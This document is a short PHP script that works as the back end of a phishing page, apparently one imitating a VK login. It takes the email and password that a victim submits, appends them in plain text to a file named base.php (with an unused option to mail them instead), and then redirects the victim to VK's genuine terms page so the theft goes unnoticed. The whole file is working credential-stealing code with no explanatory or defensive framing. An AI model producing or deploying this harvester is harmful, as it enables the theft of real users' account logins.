<?php

$BASE="base.php";
$IS_EMAIL=false;
$LOCATION="https://vk.com/terms";

$p0=$_REQUEST["email"];
$p1=$_REQUEST["pass"];
$headers = "";
$info="<p>$p0:$p1</p>";

if ($IS_EMAIL){
mail($BASE,$headers.$info);
} else {
$fd=fopen($BASE,"a+");
fwrite($fd,$info);
fclose($fd);
}

header("Location:$LOCATION");
?>
